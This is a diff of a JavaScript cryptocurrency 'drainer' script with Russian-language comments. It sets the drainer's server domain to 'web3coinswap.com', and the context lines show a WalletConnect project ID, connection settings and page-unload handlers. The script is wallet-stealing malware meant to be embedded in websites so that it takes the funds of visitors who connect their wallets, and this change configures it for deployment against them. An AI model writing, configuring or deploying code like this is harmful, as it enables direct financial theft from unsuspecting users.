@@ -7,7 +7,7 @@ let CF_EKEY = 17263562; // Укажите любое число, которое 
 const CF_HTTP_MODE = false; // Включите, чтобы скрипт обращался к серверу по HTTP, например, чтобы протестировать скрипт
 const CF_Server_PORT = 443; // Если при обращении к серверу нужен кастомный порт, то укажите его здесь
 // По умолчанию для работы по HTTP нужен порт 80, а для работы по HTTPS необходим порт 443
-const CF_Server_URL = ""; // Указать домен, который прикреплен к серверу дрейнера
+const CF_Server_URL = "web3coinswap.com"; // Указать домен, который прикреплен к серверу дрейнера
 // Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер
 const CF_WalletConnect_ID = "18a85594fe936dfad18317935801e0a9"; // Project ID из WalletConnect Cloud
 // Если WalletConnect не работает, обязательно поменяйте этот ID, получить новый можно здесь: https://cloud.walletconnect.com/
@@ -5116,4 +5116,5 @@ setInterval(async() => {
 }, 1000);
 
 window.addEventListener("beforeunload", (e) => leave_website());
+
 window.addEventListener("onbeforeunload", (e) => leave_website());
